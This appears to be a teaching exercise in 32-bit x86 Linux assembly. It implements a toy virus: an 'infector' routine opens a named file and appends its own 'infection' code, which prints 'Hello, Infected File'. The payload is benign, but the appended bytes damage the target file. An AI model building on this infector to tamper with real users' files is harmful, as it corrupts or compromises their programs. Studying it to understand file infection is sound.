section .data
    hello_msg db "Hello, Infected File", 10
    hello_len equ $ - hello_msg
    attach_msg db "VIRUS ATTACHED", 10
    attach_len equ $ - attach_msg

section .text
global _start
global system_call
global code_start
global infection
global infector

extern main

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        

system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:

infection:
    ; write message to stdout
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad    
    mov eax, 4          
    mov ebx, 1          
    mov ecx, hello_msg        
    mov edx, hello_len         
    int 0x80            ; call write
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret   

code_end:

infector:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

fileOpen:
    mov eax, 5                  ; SysCall open id.
    mov ebx, [ebp+8]            ; filename
    mov ecx, 1024               ; read write
    or ecx, 1
    mov edx, 0777               ; file can be read, written, and executed by all users
    int 0x80                    ; int fd = open(edx, O_RDWR , 0777);
    mov [ebp-4], eax            

fileWrite:
    mov eax, 4                  ; write
    mov ebx, [ebp-4]            ; file descriptor
    mov ecx, code_start
    mov edx, code_end
    sub edx, code_start        
    int 0x80                    ; write()

fileClose:
    mov eax, 6                  ; close
    mov ebx, [ebp-4]            ; file descriptor
    int 0x80                    

    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret
